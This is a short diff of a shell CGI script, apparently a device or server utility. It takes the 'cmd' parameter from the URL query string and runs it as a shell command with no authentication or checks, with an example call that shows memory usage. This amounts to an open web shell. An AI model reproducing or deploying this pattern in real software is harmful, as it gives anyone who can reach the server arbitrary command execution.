@@ -1,16 +1,15 @@
-#!/bin/bash
+#!/bin/sh
 
-. ./bashlib
+. ./commonScript
 
-head 
+head
 
-SHELL_CMD=`param cmd`
+SHELL_CMD=`parse cmd $QUERY_STRING`
 
 if [ "$SHELL_CMD" == "" ];then
     echo FAILED
     echo example:
     echo http://127.0.0.1/shell?cmd=free    #show the memory information
 fi
-
 
 $SHELL_CMD
